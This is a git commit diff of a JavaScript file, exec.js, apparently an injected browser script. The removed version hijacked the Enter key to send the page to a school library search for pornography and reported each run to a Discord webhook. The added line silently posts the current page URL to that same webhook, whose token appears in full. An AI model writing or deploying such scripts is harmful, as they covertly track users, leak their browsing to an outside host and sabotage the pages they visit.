f27e730e67719d84246b44c582fe5398e333d9a5
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-22 11:32:44 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,12 +1,1 @@
-var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it started'});xhr.send(data);
-
-(function() { 
-    document.addEventListener('keydown', function(event) {
-        if (event.key === 'Enter') {
-            window.location.href = 'https://search.follettsoftware.com/metasearch/ui/134341/search/all?q=furry%20porn&ists=0&activeMenu=HOME';
-            var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it ran'});xhr.send(data);
-        }
-    });
-})();
-
-console.log('h')
+var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": window.location.href});xhr.send(data);
